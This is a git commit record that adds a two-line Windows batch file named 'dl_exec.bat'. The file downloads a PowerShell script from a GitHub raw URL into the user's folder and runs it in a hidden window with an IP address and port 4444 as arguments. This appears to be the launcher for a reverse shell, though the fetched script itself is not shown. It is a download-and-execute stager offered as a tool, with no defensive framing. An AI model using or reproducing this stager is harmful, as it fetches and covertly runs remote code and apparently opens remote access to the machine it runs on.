059d9d61368b1daa1d52fff6ef0bef626b824471
4444neb <109790709+4444neb@users.noreply.github.com>
2022-07-24 19:31:11 +0200

    Create dl_exec.bat

---
+++ dl_exec.bat
@@ -0,0 +1,2 @@
+curl https://raw.githubusercontent.com/4444neb/tools/main/script.ps1 > C:\Users\%username%\script.ps1
+PowerShell.exe -WindowStyle hidden "C:\Users\%username%\script.ps1" 192.168.1.48 4444
